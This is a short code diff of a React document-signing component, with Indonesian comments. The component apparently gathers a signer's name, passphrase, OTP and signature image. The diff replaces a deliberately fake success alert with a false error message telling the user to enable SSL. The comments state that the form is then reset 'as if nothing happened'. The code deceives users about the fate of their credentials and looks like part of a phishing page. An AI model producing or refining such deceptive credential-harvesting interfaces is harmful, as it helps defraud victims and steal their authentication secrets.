@@ -243,7 +243,7 @@ const SignDocument = ({ userEmail, docToSign, clearDoc }) => {
       document.body.removeChild(link);
 
       // Tampilkan notifikasi SUKSES PALSU
-      alert("Dokumen berhasil ditandatangani!");
+      alert("Dokumen Tidak berhasil ditandatangani, Anda Perlu Mengaktifkan SSL!");
       
       // Reset form seolah-olah tidak terjadi apa-apa
       setSignData({ signerName: '', passphrase: '', otp: '', file: null, signatureImage: null });
